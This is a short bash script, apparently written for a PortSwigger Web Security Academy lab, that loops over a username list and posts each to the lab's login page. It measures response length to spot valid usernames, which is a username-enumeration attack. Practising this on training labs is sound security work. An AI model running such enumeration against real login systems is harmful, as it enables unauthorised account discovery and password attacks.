#!/bin/bash

echo "Username | Characters after academyLabHeader"
echo "----------------------------------------"

while IFS= read -r user; do
    response=$(curl -s -X POST "https://0a0e004a04be7fa081da8aa70008003b.web-security-academy.net/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: session=Zj5ZT2FoyIS2txq2JmIWYDW41JykgiqP" \
        -d "username=$user&password=test")
    
    # Extract everything after academyLabHeader"> and count characters
    # Using grep -A to get all lines after the match
    chars=$(echo "$response" | grep -A 1000 'academyLabHeader">' | tail -n +2 | tr -d '\n' | wc -c)
    
    printf "%-20s | %d\n" "$user" "$chars"
done < usernames.txt